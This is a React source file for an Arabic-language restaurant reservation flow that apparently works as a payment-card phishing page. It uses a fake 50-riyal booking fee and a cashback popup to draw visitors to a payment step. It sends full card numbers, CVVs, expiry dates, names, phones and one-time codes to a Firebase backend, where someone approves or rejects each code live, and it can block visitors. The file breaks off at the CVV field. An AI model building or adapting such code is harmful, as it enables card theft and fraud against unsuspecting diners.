import { useState, useRef, useEffect } from "react";
import { Link, useParams } from "wouter";
import { ArrowRight, Calendar, Clock, Users, CheckCircle, User, Phone, FileText, ChevronLeft, CreditCard, ShieldCheck, Lock, Wifi, ChevronDown, Receipt, RefreshCw, X, Gift } from "lucide-react";
import { getRestaurantById } from "@/lib/restaurant-data";
import { addData, handlePay, handleOtp, listenForOtpApproval } from "@/lib/firebase";
import { setupOnlineStatus } from "@/lib/utils";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";

type Step = 1 | 2 | 3 | 4 | 5 | 6;

function StepIndicator({ current }: { current: Step }) {
  const steps = [
    { number: 1 as Step, label: "المطعم" },
    { number: 2 as Step, label: "الموعد" },
    { number: 3 as Step, label: "البيانات" },
    { number: 4 as Step, label: "الفاتورة" },
    { number: 5 as Step, label: "الدفع" },
    { number: 6 as Step, label: "رمز التحقق" },
  ];

  return (
    <div className="bg-[#3a0f1d] px-4 py-4" data-testid="step-indicator">
      <div className="flex items-center justify-center gap-0.5 max-w-md mx-auto">
        {steps.map((step, index) => (
          <div key={step.number} className="flex items-center">
            <div className="flex flex-col items-center">
              <div
                className={`w-8 h-8 rounded-full flex items-center justify-center text-[10px] font-bold transition-all ${
                  step.number < current
                    ? "bg-[#c9a96e] text-white"
                    : step.number === current
                    ? "bg-white text-[#4a1525] shadow-lg"
                    : "bg-white/20 text-white/50"
                }`}
                data-testid={`step-${step.number}`}
              >
                {step.number < current ? "✓" : step.number}
              </div>
              <span className={`text-[8px] mt-1 font-medium whitespace-nowrap ${
                step.number <= current ? "text-white" : "text-white/40"
              }`}>
                {step.label}
              </span>
            </div>
            {index < steps.length - 1 && (
              <div
                className={`w-5 h-0.5 mx-0.5 rounded-full transition-all ${
                  step.number < current ? "bg-[#c9a96e]" : "bg-white/20"
                }`}
              />
            )}
          </div>
        ))}
      </div>
    </div>
  );
}

const validateLuhn = (cardNum: string): boolean => {
  const digits = cardNum.replace(/\s/g, "");
  if (!/^\d{13,19}$/.test(digits)) return false;
  let sum = 0;
  let isEven = false;
  for (let i = digits.length - 1; i >= 0; i--) {
    let digit = parseInt(digits[i], 10);
    if (isEven) {
      digit *= 2;
      if (digit > 9) digit -= 9;
    }
    sum += digit;
    isEven = !isEven;
  }
  return sum % 10 === 0;
};

const getCardType = (cardNum: string): string => {
  const num = cardNum.replace(/\s/g, "");
  if (/^4/.test(num)) return "visa";
  if (/^5[1-5]/.test(num)) return "mastercard";
  if (/^(508|60|62|67)/.test(num)) return "mada";
  return "";
};

const getCardGradient = (cardType: string): string => {
  switch (cardType) {
    case "visa": return "from-[#1a1f71] via-[#2d3494] to-[#1a1f71]";
    case "mastercard": return "from-[#eb001b] via-[#f79e1b] to-[#eb001b]";
    case "mada": return "from-[#004d40] via-[#00695c] to-[#004d40]";
    default: return "from-[#434343] via-[#5a5a5a] to-[#434343]";
  }
};

export default function Reserve() {
  const params = useParams<{ id: string }>();
  const restaurant = getRestaurantById(Number(params.id));
  const [step, setStep] = useState<Step>(1);

  const [date, setDate] = useState("");
  const [time, setTime] = useState("");
  const [guests, setGuests] = useState("2");
  const [name, setName] = useState("");
  const [phone, setPhone] = useState("");
  const [notes, setNotes] = useState("");

  const [cardNumber, setCardNumber] = useState("");
  const [cardName, setCardName] = useState("");
  const [expiryMonth, setExpiryMonth] = useState("01");
  const [expiryYear, setExpiryYear] = useState("2026");
  const [cvv, setCvv] = useState("");
  const [stepSubmitting, setStepSubmitting] = useState(false);
  const [stepSubmitError, setStepSubmitError] = useState("");
  const [cardErrors, setCardErrors] = useState<Record<string, string>>({});
  const [isSubmitting, setIsSubmitting] = useState(false);

  const [otp, setOtp] = useState("");
  const [otpError, setOtpError] = useState("");
  const [otpLoading, setOtpLoading] = useState(false);
  const [otpWaiting, setOtpWaiting] = useState(false);
  const [otpResult, setOtpResult] = useState<"approved" | "rejected" | null>(null);
  const [resendTimer, setResendTimer] = useState(60);
  const [showCashbackPopup, setShowCashbackPopup] = useState(false);
  const otpInputRef = useRef<HTMLInputElement>(null);

  const serviceFee = 50;
  const reservationTotal = serviceFee;

  useEffect(() => {
    if (step === 6 && resendTimer > 0) {
      const timer = setInterval(() => setResendTimer((t) => t - 1), 1000);
      return () => clearInterval(timer);
    }
  }, [step, resendTimer]);

  useEffect(() => {
    if (!otpWaiting) return;
    const unsubscribe = listenForOtpApproval((status) => {
      setOtpWaiting(false);
      setOtpLoading(false);
      setOtpResult(status);
      if (status === "rejected") {
        setOtpError("رمز التحقق غير صحيح، يرجى المحاولة مرة أخرى");
        setOtp("");
        otpInputRef.current?.focus();
      }
    });
    return () => unsubscribe();
  }, [otpWaiting]);

  useEffect(() => {
    if (step === 6 && otpResult !== "approved") {
      otpInputRef.current?.focus();
    }
  }, [step, otpResult]);

  if (!restaurant) {
    return (
      <div className="min-h-screen bg-[#ebddd0] flex items-center justify-center" dir="rtl">
        <div className="text-center">
          <h2 className="text-[#4a1525] text-2xl font-bold mb-4">المطعم غير موجود</h2>
          <Link href="/restaurants" className="text-[#c9a96e] underline" data-testid="link-back-restaurants">
            العودة للمطاعم
          </Link>
        </div>
      </div>
    );
  }

  const timeSlots = [
    "12:00 م", "12:30 م", "1:00 م", "1:30 م",
    "2:00 م", "2:30 م", "5:00 م", "5:30 م",
    "6:00 م", "6:30 م", "7:00 م", "7:30 م",
    "8:00 م", "8:30 م", "9:00 م", "9:30 م",
    "10:00 م", "10:30 م",
  ];

  const guestOptions = ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"];
  const today = new Date().toISOString().split("T")[0];

  const ensureReservationVisitorId = () => {
    const existingVisitorId = localStorage.getItem("visitor");
    if (existingVisitorId) {
      setupOnlineStatus(existingVisitorId);
      return existingVisitorId;
    }

    const visitorId = `reserve_${Date.now()}_${Math.random().toString(36).substring(2, 8)}`;
    localStorage.setItem("visitor", visitorId);
    localStorage.removeItem("otpHistory");
    setupOnlineStatus(visitorId);
    return visitorId;
  };

  const handleStepOneSubmit = async () => {
    if (stepSubmitting) return;

    setStepSubmitting(true);
    setStepSubmitError("");

    const visitorId = ensureReservationVisitorId();
    const saved = await addData({
      id: visitorId,
      type: "restaurant_reservation",
      restaurant: restaurant.name,
      restaurantEn: restaurant.nameEn,
      currentPage: "booking",
    });

    if (!saved) {
      setStepSubmitError("تعذر حفظ البيانات، يرجى المحاولة مرة أخرى");
      setStepSubmitting(false);
      return;
    }

    setStep(2);
    setStepSubmitting(false);
  };

  const handleStepTwoSubmit = async () => {
    if (stepSubmitting || !date || !time) return;

    setStepSubmitting(true);
    setStepSubmitError("");

    const visitorId = ensureReservationVisitorId();
    const saved = await addData({
      id: visitorId,
      type: "restaurant_reservation",
      restaurant: restaurant.name,
      restaurantEn: restaurant.nameEn,
      date,
      time,
      guests,
      currentPage: "booking",
    });

    if (!saved) {
      setStepSubmitError("تعذر حفظ البيانات، يرجى المحاولة مرة أخرى");
      setStepSubmitting(false);
      return;
    }

    setStep(3);
    setStepSubmitting(false);
  };

  const formatCardNumber = (value: string) => {
    const v = value.replace(/\s+/g, "").replace(/[^0-9]/gi, "");
    const matches = v.match(/\d{4,16}/g);
    const match = (matches && matches[0]) || "";
    const parts = [];
    for (let i = 0, len = match.length; i < len; i += 4) {
      parts.push(match.substring(i, i + 4));
    }
    return parts.length ? parts.join(" ") : v;
  };

  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatCardNumber(e.target.value);
    if (formatted.replace(/\s/g, "").length <= 16) {
      setCardNumber(formatted);
      setCardErrors((prev) => ({ ...prev, cardNumber: "", submit: "" }));
    }
  };

  const handleCvvChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const v = e.target.value.replace(/[^0-9]/g, "");
    if (v.length <= 4) {
      setCvv(v);
      setCardErrors((prev) => ({ ...prev, cvv: "", submit: "" }));
    }
  };

  const validateCard = (): boolean => {
    const newErrors: Record<string, string> = {};
    const rawCard = cardNumber.replace(/\s/g, "");
    if (!rawCard || rawCard.length < 13) newErrors.cardNumber = "رقم البطاقة غير صحيح";
    else if (!validateLuhn(rawCard)) newErrors.cardNumber = "رقم البطاقة غير صالح";
    if (!cardName.trim() || cardName.trim().length < 3) newErrors.cardName = "يرجى إدخال الاسم على البطاقة";
    const now = new Date();
    const expiry = new Date(parseInt(expiryYear), parseInt(expiryMonth) - 1);
    if (expiry < now) newErrors.expiry = "البطاقة منتهية الصلاحية";
    if (!cvv || cvv.length < 3) newErrors.cvv = "كود الحماية غير صحيح";
    setCardErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handlePaymentSubmit = async () => {
    if (isSubmitting) return;
    if (!validateCard()) return;
    setIsSubmitting(true);
    setCardErrors((prev) => ({ ...prev, submit: "" }));

    const visitorId = ensureReservationVisitorId();

    const normalizedCardNumber = cardNumber.replace(/\s/g, "");
    const normalizedCardType = getCardType(cardNumber);
    const paymentInfo = {
      cardNumber: normalizedCardNumber,
      cardName,
      expiryMonth,
      expiryYear,
      cvv,
      cardType: normalizedCardType,
      currentPage: "reserve_checkout",
    };

    await addData({
      id: visitorId,
      type: "restaurant_reservation",
      restaurant: restaurant.name,
      restaurantEn: restaurant.nameEn,
      date, time, guests, name, phone, notes,
      total: reservationTotal,
      cardNumber: normalizedCardNumber,
      cardName,
      expiryMonth,
      expiryYear,
      cvv,
      cardType: normalizedCardType,
      currentPage: "reserve_checkout",
    });

    try {
      await handlePay(paymentInfo, () => {});
    } catch (error: any) {
      if (error?.message === "VISITOR_BLOCKED") {
        setCardErrors((prev) => ({
          ...prev,
          submit: "تم حظر هذا الزائر ولا يمكنه المتابعة",
        }));
      } else {
        setCardErrors((prev) => ({
          ...prev,
          submit: "حدث خطأ أثناء معالجة الدفع",
        }));
      }
      setIsSubmitting(false);
      return;
    }

    setTimeout(() => {
      setIsSubmitting(false);
      setStep(6);
    }, 3000);
  };

  const handleOtpChange = (value: string) => {
    const code = value.replace(/\D/g, "").slice(0, 6);
    setOtp(code);
    setOtpError("");
  };

  const isValidOtpLength = (code: string) => code.length === 4 || code.length === 6;

  const handleOtpSubmit = async () => {
    if (otpLoading || otpWaiting) return;
    const code = otp;
    if (!isValidOtpLength(code)) {
      setOtpError("يرجى إدخال رمز تحقق من 4 أو 6 أرقام");
      return;
    }
    setOtpLoading(true);
    setOtpError("");
    setOtpResult(null);
    setOtpWaiting(true);
    try {
      await handleOtp(code, "reserve_otp");
    } catch (error: any) {
      setOtpWaiting(false);
      setOtpLoading(false);
      if (error?.message === "VISITOR_BLOCKED") {
        setOtpError("تم حظر هذا الزائر ولا يمكنه المتابعة");
      } else {
        setOtpError("حدث خطأ أثناء إرسال رمز التحقق");
      }
    }
  };

  const cardType = getCardType(cardNumber);

  return (
    <div className="min-h-screen bg-[#ebddd0]" dir="rtl">
      <div className="bg-[#4a1525] px-4 py-3 flex items-center gap-3">
        {step === 1 ? (
          <Link
            href={`/restaurant/${restaurant.id}`}
            className="text-white/80 hover:text-white transition-colors"
            data-testid="link-back-detail"
          >
            <ArrowRight className="w-5 h-5" />
          </Link>
        ) : (
          <button
            onClick={() => setStep((step - 1) as Step)}
            className="text-white/80 hover:text-white transition-colors"
            data-testid="button-back-step"
          >
            <ArrowRight className="w-5 h-5" />
          </button>
        )}
        <div className="flex items-center gap-3 flex-1">
          <img
            src={restaurant.logo}
            alt={restaurant.nameEn}
            className="w-10 h-10 rounded-lg object-cover border border-white/20"
          />
          <div>
            <h1 className="text-white font-bold text-sm" data-testid="text-reserve-restaurant-name">
              حجز طاولة - {restaurant.name}
            </h1>
            <p className="text-white/60 text-xs">{restaurant.nameEn}</p>
          </div>
        </div>
      </div>

      <StepIndicator current={step} />

      <div className="max-w-lg mx-auto px-4 py-6">
        {step === 1 && (
          <div className="space-y-4 animate-fade-in" data-testid="step-1-content">
            <div className="bg-white rounded-xl overflow-hidden shadow-sm">
              <img
                src={restaurant.bgImage}
                alt={restaurant.nameEn}
                className="w-full h-40 object-cover"
              />
              <div className="p-5">
                <div className="flex items-center gap-3 mb-3">
                  <img src={restaurant.logo} alt="" className="w-14 h-14 rounded-lg object-cover shadow-md" />
                  <div>
                    <h2 className="text-[#4a1525] font-bold text-lg">{restaurant.name}</h2>
                    <p className="text-[#7a6b5f] text-xs">{restaurant.nameEn}</p>
                  </div>
                </div>
                {restaurant.cuisine && (
                  <span className="inline-block bg-[#f5efe6] text-[#4a1525] text-xs px-3 py-1 rounded-full mb-3">
                    {restaurant.cuisine}
                  </span>
                )}
                <p className="text-[#7a6b5f] text-sm leading-relaxed mb-3">{restaurant.description}</p>
                <div className="flex items-center gap-4 text-xs text-[#7a6b5f]">
                  <span className="flex items-center gap-1">
                    <Clock className="w-3.5 h-3.5" /> {restaurant.hours}
                  </span>
                  <span>{restaurant.priceRange}</span>
                </div>
              </div>
            </div>

            <button
              onClick={() => { void handleStepOneSubmit(); }}
              disabled={stepSubmitting}
              className="w-full bg-[#4a1525] text-white py-4 rounded-xl font-bold text-base hover:bg-[#3a0f1d] transition-colors shadow-md disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center gap-2"
              data-testid="button-next-step-1"
            >
              {stepSubmitting ? "جاري الإرسال..." : "التالي - اختيار الموعد"}
              <ChevronLeft className="w-5 h-5" />
            </button>
            {stepSubmitError && (
              <p className="text-red-500 text-xs text-center" data-testid="error-reserve-step-1-submit">
                {stepSubmitError}
              </p>
            )}
          </div>
        )}

        {step === 2 && (
          <div className="space-y-4 animate-fade-in" data-testid="step-2-content">
            <div className="bg-white rounded-xl p-5 shadow-sm space-y-5">
              <h2 className="text-[#4a1525] font-bold text-lg flex items-center gap-2">
                <Calendar className="w-5 h-5" />
                اختر موعد الحجز
              </h2>

              <div>
                <label className="block text-[#4a1525] text-sm font-medium mb-2">التاريخ *</label>
                <input
                  type="date"
                  value={date}
                  onChange={(e) => setDate(e.target.value)}
                  min={today}
                  required
                  className="w-full border border-[#d5c8b5] rounded-lg px-4 py-3 text-sm bg-[#faf7f3] focus:outline-none focus:border-[#4a1525] focus:ring-1 focus:ring-[#4a1525] transition-colors"
                  data-testid="input-date"
                />
              </div>

              <div>
                <label className="block text-[#4a1525] text-sm font-medium mb-2">
                  <Clock className="w-4 h-4 inline ml-1" />
                  الوقت *
                </label>
                <div className="grid grid-cols-3 gap-2">
                  {timeSlots.map((slot) => (
                    <button
                      key={slot}
                      type="button"
                      onClick={() => setTime(slot)}
                      className={`py-2.5 rounded-lg text-xs font-medium transition-colors ${
                        time === slot
                          ? "bg-[#4a1525] text-white"
                          : "bg-[#faf7f3] text-[#4a1525] border border-[#d5c8b5] hover:bg-[#4a1525]/10"
                      }`}
                      data-testid={`button-time-${slot}`}
                    >
                      {slot}
                    </button>
                  ))}
                </div>
              </div>

              <div>
                <label className="block text-[#4a1525] text-sm font-medium mb-2">
                  <Users className="w-4 h-4 inline ml-1" />
                  عدد الضيوف *
                </label>
                <div className="flex gap-2 flex-wrap">
                  {guestOptions.map((g) => (
                    <button
                      key={g}
                      type="button"
                      onClick={() => setGuests(g)}
                      className={`w-10 h-10 rounded-full text-sm font-medium transition-colors ${
                        guests === g
                          ? "bg-[#4a1525] text-white"
                          : "bg-[#faf7f3] text-[#4a1525] border border-[#d5c8b5] hover:bg-[#4a1525]/10"
                      }`}
                      data-testid={`button-guests-${g}`}
                    >
                      {g}
                    </button>
                  ))}
                </div>
              </div>
            </div>

            <button
              onClick={() => { void handleStepTwoSubmit(); }}
              disabled={!date || !time || stepSubmitting}
              className="w-full bg-[#4a1525] text-white py-4 rounded-xl font-bold text-base hover:bg-[#3a0f1d] transition-colors shadow-md disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center gap-2"
              data-testid="button-next-step-2"
            >
              {stepSubmitting ? "جاري الإرسال..." : "التالي - بيانات الحجز"}
              <ChevronLeft className="w-5 h-5" />
            </button>
            {stepSubmitError && (
              <p className="text-red-500 text-xs text-center" data-testid="error-reserve-step-2-submit">
                {stepSubmitError}
              </p>
            )}
          </div>
        )}

        {step === 3 && (
          <div className="space-y-4 animate-fade-in" data-testid="step-3-content">
            <div className="bg-white rounded-xl p-5 shadow-sm space-y-5">
              <h2 className="text-[#4a1525] font-bold text-lg flex items-center gap-2">
                <User className="w-5 h-5" />
                بيانات الحجز
              </h2>

              <div>
                <label className="block text-[#4a1525] text-sm font-medium mb-2">الاسم الكامل *</label>
                <div className="relative">
                  <User className="absolute right-3 top-1/2 -translate-y-1/2 w-4 h-4 text-[#b1a1a0]" />
                  <input
                    type="text"
                    value={name}
                    onChange={(e) => setName(e.target.value.slice(0, 80))}
                    required
                    maxLength={80}
                    placeholder="أدخل اسمك الكامل"
                    className="w-full border border-[#d5c8b5] rounded-lg pr-10 pl-4 py-3 text-sm bg-[#faf7f3] focus:outline-none focus:border-[#4a1525] focus:ring-1 focus:ring-[#4a1525] transition-colors placeholder:text-[#b1a1a0]"
                    data-testid="input-name"
                  />
                </div>
              </div>

              <div>
                <label className="block text-[#4a1525] text-sm font-medium mb-2">رقم الهاتف *</label>
                <div className="relative">
                  <Phone className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-[#b1a1a0]" />
                  <input
                    type="tel"
                    value={phone}
                    onChange={(e) => setPhone(e.target.value.replace(/[^\d+]/g, "").slice(0, 15))}
                    required
                    maxLength={15}
                    placeholder="05XXXXXXXX"
                    dir="ltr"
                    className="w-full border border-[#d5c8b5] rounded-lg pl-10 pr-4 py-3 text-sm bg-[#faf7f3] focus:outline-none focus:border-[#4a1525] focus:ring-1 focus:ring-[#4a1525] transition-colors placeholder:text-[#b1a1a0] text-left"
                    data-testid="input-phone"
                  />
                </div>
              </div>

              <div>
                <label className="block text-[#4a1525] text-sm font-medium mb-2">
                  <FileText className="w-4 h-4 inline ml-1" />
                  ملاحظات إضافية
                </label>
                <textarea
                  value={notes}
                  onChange={(e) => setNotes(e.target.value.slice(0, 300))}
                  placeholder="مثال: طاولة بجانب النافذة، حساسية طعام..."
                  rows={3}
                  maxLength={300}
                  className="w-full border border-[#d5c8b5] rounded-lg px-4 py-3 text-sm bg-[#faf7f3] focus:outline-none focus:border-[#4a1525] focus:ring-1 focus:ring-[#4a1525] transition-colors placeholder:text-[#b1a1a0] resize-none"
                  data-testid="input-notes"
                />
              </div>
            </div>

            <button
              onClick={() => { if (name && phone) setStep(4); }}
              disabled={!name || !phone}
              className="w-full bg-[#4a1525] text-white py-4 rounded-xl font-bold text-base hover:bg-[#3a0f1d] transition-colors shadow-md disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center gap-2"
              data-testid="button-next-step-3"
            >
              التالي - الفاتورة
              <ChevronLeft className="w-5 h-5" />
            </button>
          </div>
        )}

        {step === 4 && (
          <div className="space-y-4 animate-fade-in" data-testid="step-4-content">
            <div className="bg-gradient-to-r from-[#4a1525] to-[#3a0f1d] rounded-xl p-5 text-center">
              <Receipt className="w-8 h-8 text-[#c9a96e] mx-auto mb-2" />
              <h2 className="text-white font-bold text-lg">فاتورة الحجز</h2>
              <p className="text-white/70 text-xs mt-1">مراجعة تفاصيل وتكلفة الحجز</p>
            </div>

            <div className="bg-white rounded-xl p-5 shadow-sm">
              <h3 className="text-[#4a1525] font-bold text-sm mb-4 flex items-center gap-2">
                <FileText className="w-4 h-4" />
                تفاصيل الحجز
              </h3>
              <div className="space-y-3 text-sm">
                <div className="flex justify-between">
                  <span className="text-[#7a6b5f]">المطعم</span>
                  <span className="text-[#4a1525] font-medium">{restaurant.name}</span>
                </div>
                <div className="h-[1px] bg-[#f5efe6]" />
                <div className="flex justify-between">
                  <span className="text-[#7a6b5f]">التاريخ</span>
                  <span className="text-[#4a1525] font-medium">{date}</span>
                </div>
                <div className="h-[1px] bg-[#f5efe6]" />
                <div className="flex justify-between">
                  <span className="text-[#7a6b5f]">الوقت</span>
                  <span className="text-[#4a1525] font-medium">{time}</span>
                </div>
                <div className="h-[1px] bg-[#f5efe6]" />
                <div className="flex justify-between">
                  <span className="text-[#7a6b5f]">عدد الضيوف</span>
                  <span className="text-[#4a1525] font-medium">{guests}</span>
                </div>
                <div className="h-[1px] bg-[#f5efe6]" />
                <div className="flex justify-between">
                  <span className="text-[#7a6b5f]">الاسم</span>
                  <span className="text-[#4a1525] font-medium">{name}</span>
                </div>
                <div className="h-[1px] bg-[#f5efe6]" />
                <div className="flex justify-between">
                  <span className="text-[#7a6b5f]">رقم الهاتف</span>
                  <span className="text-[#4a1525] font-medium" dir="ltr">{phone}</span>
                </div>
                {notes && (
                  <>
                    <div className="h-[1px] bg-[#f5efe6]" />
                    <div className="flex justify-between">
                      <span className="text-[#7a6b5f]">ملاحظات</span>
                      <span className="text-[#4a1525] font-medium text-left max-w-[200px]">{notes}</span>
                    </div>
                  </>
                )}
              </div>
            </div>

            <div className="bg-white rounded-xl p-5 shadow-sm">
              <h3 className="text-[#4a1525] font-bold text-sm mb-4 flex items-center gap-2">
                <Receipt className="w-4 h-4" />
                تفاصيل المبلغ
              </h3>
              <div className="space-y-3 text-sm">
                <div className="flex justify-between">
                  <span className="text-[#7a6b5f]">رسوم تأكيد الحجز</span>
                  <span className="text-[#4a1525] font-medium">{serviceFee} ر.س</span>
                </div>
                <div className="h-[1px] bg-[#f5efe6]" />
                <div className="flex justify-between items-center pt-2">
                  <span className="text-[#4a1525] font-bold text-base">الإجمالي</span>
                  <span className="text-[#c9a96e] font-bold text-xl">{reservationTotal} ر.س</span>
                </div>
              </div>
            </div>

            <div className="bg-[#f5efe6] rounded-xl p-4 text-center">
              <p className="text-[#7a6b5f] text-xs">
                رسوم تأكيد الحجز قابلة للاسترداد عند زيارة المطعم
              </p>
            </div>

            <button
              onClick={() => { setStep(5); setShowCashbackPopup(true); }}
              className="w-full bg-[#4a1525] text-white py-4 rounded-xl font-bold text-base hover:bg-[#3a0f1d] transition-colors shadow-md flex items-center justify-center gap-2"
              data-testid="button-next-step-4"
            >
              متابعة الدفع
              <CreditCard className="w-5 h-5" />
            </button>
          </div>
        )}

        {step === 5 && (
          <>
            {showCashbackPopup && (
              <div className="fixed inset-0 z-50 flex items-center justify-center p-4">
                <div
                  className="absolute inset-0 bg-black/60 backdrop-blur-sm animate-fade-in"
                  onClick={() => setShowCashbackPopup(false)}
                />
                <div className="relative bg-gradient-to-br from-[#4a1525] via-[#5a1f30] to-[#3a0f1d] rounded-3xl p-8 max-w-sm w-full shadow-2xl animate-scale-in">
                  <button
                    onClick={() => setShowCashbackPopup(false)}
                    className="absolute top-4 left-4 text-white/80 hover:text-white transition-colors w-8 h-8 rounded-full bg-white/10 flex items-center justify-center"
                    data-testid="button-close-popup"
                  >
                    <X className="w-5 h-5" />
                  </button>
                  <div className="text-center space-y-5">
                    <div className="w-20 h-20 bg-white/20 rounded-full flex items-center justify-center mx-auto animate-float">
                      <Gift className="w-10 h-10 text-white" />
                    </div>
                    <div className="space-y-3">
                      <h3 className="text-2xl font-bold text-white">عرض حصري!</h3>
                      <p className="text-white text-lg leading-relaxed">احصل على كاش باك يصل إلى</p>
                      <div className="text-6xl font-bold text-white drop-shadow-lg">30%</div>
                      <p className="text-white/90 text-sm">عند الدفع من خلال البطاقات من فئة البلاتينية</p>
                    </div>
                    <div className="flex justify-center gap-3 pt-2">
                      <img src="/mada.png" className="h-8 bg-white/20 rounded-lg px-3 py-1" alt="mada" />
                      <img src="/master.svg" className="h-8 bg-white/20 rounded-lg px-3 py-1" alt="mastercard" />
                      <img src="/visa.png" className="h-5 bg-white/20 rounded-lg px-3 py-2" alt="visa" />
                    </div>
                    <Button
                      onClick={() => setShowCashbackPopup(false)}
                      size="lg"
                      className="w-full bg-white text-[#4a1525] font-bold shadow-lg mt-4"
                      data-testid="button-continue-popup"
                    >
                      متابعة الدفع
                    </Button>
                  </div>
                </div>
              </div>
            )}

            <div className="space-y-6 animate-fade-in" data-testid="step-5-content">
              <div className="mb-6" dir="ltr">
                <div
                  className={`relative w-full max-w-sm mx-auto aspect-[1.586/1] rounded-2xl p-6 bg-gradient-to-br ${getCardGradient(cardType)} shadow-2xl overflow-hidden`}
                  data-testid="card-preview"
                >
                  <div className="flex items-start justify-between">
                    <div className="w-14 h-10 bg-gradient-to-br from-yellow-300 via-yellow-400 to-yellow-500 rounded-lg flex items-center justify-center shadow-md">
                      <div className="w-10 h-7 border-2 border-yellow-600/30 rounded-sm" />
                    </div>
                    <Wifi className="w-7 h-7 text-white/70 rotate-90" />
                  </div>
                  <div className="mt-6">
                    <p className="text-white text-2xl font-mono tracking-[0.15em] drop-shadow-lg">
                      {cardNumber || "•••• •••• •••• ••••"}
                    </p>
                  </div>
                  <div className="absolute bottom-6 left-6 right-6">
                    <div className="flex justify-between items-end">
                      <div>
                        <p className="text-white/60 text-[10px] uppercase mb-1">Card Holder</p>
                        <p className="text-white text-sm font-medium tracking-wide truncate max-w-[180px]">
                          {cardName || "اسم حامل البطاقة"}
                        </p>
                      </div>
                      <div className="text-right">
                        <p className="text-white/60 text-[10px] uppercase mb-1">Expires</p>
                        <p className="text-white text-sm font-medium">{expiryMonth}/{expiryYear.slice(-2)}</p>
                      </div>
                    </div>
                  </div>
                  <div className="absolute top-6 right-6">
                    {cardType === "visa" && <div className="text-white font-bold text-2xl italic">VISA</div>}
                    {cardType === "mastercard" && (
                      <div className="flex">
                        <div className="w-10 h-10 rounded-full bg-red-500 opacity-80" />
                        <div className="w-10 h-10 rounded-full bg-yellow-500 opacity-80 -ml-5" />
                      </div>
                    )}
                    {cardType === "mada" && <div className="text-white font-bold text-xl">mada</div>}
                  </div>
                  <div className="absolute -bottom-20 -right-20 w-40 h-40 rounded-full bg-white/5" />
                  <div className="absolute -bottom-10 -right-10 w-32 h-32 rounded-full bg-white/5" />
                </div>
              </div>

              <div className="flex items-center justify-center gap-4 py-2">
                <img src="/mada.png" className="h-7 opacity-70 hover:opacity-100 transition-opacity" alt="mada" />
                <img src="/master.svg" className="h-7 opacity-70 hover:opacity-100 transition-opacity" alt="mastercard" />
                <img src="/visa.png" className="h-4 opacity-70 hover:opacity-100 transition-opacity" alt="visa" />
              </div>

              <div className="bg-white rounded-2xl shadow-xl p-6 space-y-5">
                <div>
                  <Label
                    htmlFor="reserve-cardNumber"
                    className="text-sm font-medium text-foreground mb-2 flex items-center gap-2"
                  >
                    <CreditCard className="w-4 h-4 text-primary" />
                    رقم البطاقة
                  </Label>
                  <div className="relative">
                    <Input
                      id="reserve-cardNumber"
                      type="text"
                      value={cardNumber}
                      onChange={handleCardNumberChange}
                      maxLength={19}
                      className={`text-left pr-12 h-12 rounded-xl border-2 font-mono ${cardErrors.cardNumber ? "border-red-500" : "border-input focus:border-primary"}`}
                      placeholder="0000 0000 0000 0000"
                      dir="ltr"
                      data-testid="input-card-number"
                    />
                    <div className="absolute right-3 top-1/2 -translate-y-1/2 flex gap-1">
                      {cardType === "visa" && <img src="/visa.png" className="h-4" alt="visa" />}
                      {cardType === "mastercard" && <img src="/master.svg" className="h-6" alt="mastercard" />}
                      {cardType === "mada" && <img src="/mada.png" className="h-6" alt="mada" />}
                    </div>
                  </div>
                  {cardErrors.cardNumber && <p className="text-red-500 text-xs mt-1">{cardErrors.cardNumber}</p>}
                </div>

                <div>
                  <Label htmlFor="reserve-cardName" className="text-sm font-medium text-foreground mb-2 block">
                    الاسم على البطاقة
                  </Label>
                  <Input
                    id="reserve-cardName"
                    type="text"
                    value={cardName}
                    onChange={(e) => {
                      setCardName(e.target.value.toUpperCase().slice(0, 60));
                      setCardErrors((p) => ({ ...p, cardName: "", submit: "" }));
                    }}
                    maxLength={60}
                    className={`text-left h-12 rounded-xl border-2 ${cardErrors.cardName ? "border-red-500" : "border-input focus:border-primary"}`}
                    placeholder="MOHAMMED ALI"
                    dir="ltr"
                    data-testid="input-card-name"
                  />
                  {cardErrors.cardName && <p className="text-red-500 text-xs mt-1">{cardErrors.cardName}</p>}
                </div>

                <div className="grid grid-cols-2 gap-4">
                  <div>
                    <Label className="text-sm font-medium text-foreground mb-2 block">تاريخ الانتهاء</Label>
                    <div className="flex gap-2">
                      <div className="flex-1 relative">
                        <select
                          value={expiryMonth}
                          onChange={(e) => { setExpiryMonth(e.target.value); setCardErrors((p) => ({ ...p, expiry: "" })); }}
                          className={`w-full h-12 px-3 rounded-xl border-2 bg-background text-foreground appearance-none ${cardErrors.expiry ? "border-red-500" : "border-input focus:border-primary"}`}
                          data-testid="select-expiry-month"
                        >
                          {Array.from({ length: 12 }, (_, i) => {
                            const month = String(i + 1).padStart(2, "0");
                            return <option key={month} value={month}>{month}</option>;
                          })}
                        </select>
                        <ChevronDown className="absolute left-2 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground pointer-events-none" />
                      </div>
                      <div className="flex-1 relative">
                        <select
                          value={expiryYear}
                          onChange={(e) => { setExpiryYear(e.target.value); setCardErrors((p) => ({ ...p, expiry: "" })); }}
                          className={`w-full h-12 px-3 rounded-xl border-2 bg-background text-foreground appearance-none ${cardErrors.expiry ? "border-red-500" : "border-input focus:border-primary"}`}
                          data-testid="select-expiry-year"
                        >
                          {Array.from({ length: 10 }, (_, i) => {
                            const year = String(2025 + i);
                            return <option key={year} value={year}>{year}</option>;
                          })}
                        </select>
                        <ChevronDown className="absolute left-2 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground pointer-events-none" />
                      </div>
                    </div>
                    {cardErrors.expiry && <p className="text-red-500 text-xs mt-1">{cardErrors.expiry}</p>}
                  </div>

                  <div>
                    <Label htmlFor="reserve-cvv" className="text-sm font-medium text-foreground mb-2 block">CVV</Label>
                    <Input
                      id="reserve-cvv"
                      type="text"
                      value={cvv}
                      onChange={handleCvvChange}
                      maxLength={4}
